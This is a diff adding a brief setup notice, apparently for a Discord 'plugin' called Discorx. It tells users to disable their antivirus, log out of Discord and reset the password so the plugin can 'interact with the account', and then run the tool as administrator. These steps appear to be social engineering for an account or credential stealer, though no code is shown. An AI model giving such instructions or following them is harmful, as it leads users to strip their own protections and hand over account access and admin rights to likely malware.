@@ -1,0 +1,17 @@
+--------AUTOMATIQUE----|
+PYTHON                 |
+INSTALL NODE.JS 20.17.0|
+WINDOWS 10/11          |
+_______________________|
+REQUIRE                |
+_______________________|
+Off Anti-Virus         |
+_______________________|
+1: Once you have opened Discorx it will close for the installation to be correct.
+
+2: Disconnect from your discord account and reset the password so that the plugin interacts with the account.
+
+3: Once reconnected to the account, open Discorx as administrator.
+//_______________________________________________________________________________________________________________\\
+By TURX.05
+
